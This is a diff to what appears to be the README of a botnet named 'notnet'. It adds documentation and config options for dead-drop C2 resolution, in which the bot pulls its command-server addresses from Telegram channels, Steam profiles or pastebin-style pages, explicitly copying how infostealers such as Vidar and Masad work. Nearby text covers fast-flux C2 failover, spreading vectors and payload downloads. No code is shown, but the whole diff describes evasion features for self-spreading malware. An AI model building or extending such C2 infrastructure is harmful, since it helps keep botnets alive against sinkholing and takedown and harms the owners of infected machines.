@@ -47,6 +47,16 @@ repository build system. Do not treat them as available targets.
   over to the next IP automatically on connect or recv timeout — a
   sinkholed or blocked IP is abandoned on the next attempt. Disabled by
   default (single hostname resolution, as before).
+- All three channels support **dead-drop C2 resolution** (`dead_drop_url=`):
+  at boot and every `dead_drop_interval` seconds the bot fetches an opaque
+  C2-endpoint blob from a legitimate service (Telegram channel, Steam
+  profile, pastebin-style HTTP) and, **only when it echoes the shared
+  `c2_secret`**, applies it as an override for the C2 endpoints — mirroring
+  how modern infostealers (e.g. Vidar, Masad) resolve C2 through legitimate
+  chat/text infrastructure. The fetch is plaintext HTTP (the default build
+  has no TLS), so trust comes from the secret echo, not the transport. A
+  failed, malformed, or unverified fetch leaves the static config as the
+  fallback (fail-closed). Disabled by default.
 
 ## Spreading Vectors
 
@@ -144,6 +154,8 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `ws_enabled` | auto | 0/1 — explicitly enable/disable WS C2 |
 || `flux_enabled` | `0` | 0/1 — fast-flux C2: resolve all A records of each C2 hostname, rotate the active IP every `flux_ttl` seconds, fail over to the next IP on connect/recv timeout |
 || `flux_ttl` | `60` | Seconds between flux re-resolution + IP rotation (1–3600) |
+|| `dead_drop_url` | *(none)* | Dead-drop C2 endpoint: a pastebin-style HTTP URL hosting the endpoint blob. Fetched at boot and every `dead_drop_interval` s; applied only if the blob echoes `c2_secret` |
+|| `dead_drop_interval` | `300` | Seconds between dead-drop re-resolution (30–86400) |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
